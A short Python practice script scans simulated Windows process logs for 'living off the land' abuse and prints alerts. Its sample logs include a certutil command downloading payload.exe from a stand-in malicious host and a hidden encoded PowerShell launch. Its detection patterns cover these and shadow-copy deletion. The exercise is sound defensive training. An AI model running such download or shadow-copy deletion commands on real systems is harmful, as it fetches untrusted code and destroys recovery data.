# ==========================================
# Day 42: Suspicious Process Execution Monitor
# Purpose: Practice endpoint telemetry analysis and detection of Living off the Land binaries
# ==========================================

import re

print("=== SUSPICIOUS PROCESS EXECUTION MONITOR ===")

# Simulated endpoint process execution logs (Command-line telemetry)
process_logs = [
    "Process Created: C:\\Windows\\System32\\notepad.exe (PID: 1240)",
    "Process Created: powershell.exe -nop -w hidden -enc JABhAGwAbABvAHcA...",
    "Process Created: C:\\Windows\\System32\\cmd.exe /c whoami",
    "Process Created: certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe payload.exe",
    "Process Created: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
]

# Suspicious command-line signatures/indicators
suspicious_cmd_patterns = [
    r"-enc\b",                  # Encoded PowerShell commands
    r"certutil\.exe.*-urlcache", # Using Certutil to download files
    r"vssadmin\s+delete",        # Deleting volume shadow copies (Ransomware behavior)
    r"-w\s+hidden"               # Hidden window execution flags
]

def audit_process_logs(logs):
    print("[*] Auditing endpoint process telemetry for suspicious command-line patterns...\n")
    alerts = []
    
    for log in logs:
        for pattern in suspicious_cmd_patterns:
            if re.search(pattern, log, re.IGNORECASE):
                alerts.append((log, pattern))
                
    return alerts

# Run the process audit
detected_threats = audit_process_logs(process_logs)

print("--- ENDPOINT SECURITY INCIDENT SUMMARY ---")
if detected_threats:
    for log, pattern in detected_threats:
        print(f"  🚨 [HIGH RISK]: Suspicious command-line pattern detected!")
        print(f"     ├─ Log Line: {log}")
        print(f"     └─ Matched Rule Pattern: '{pattern}'\n")
else:
    print("  ✅ [SECURE]: No malicious process patterns detected.")

print("==========================================")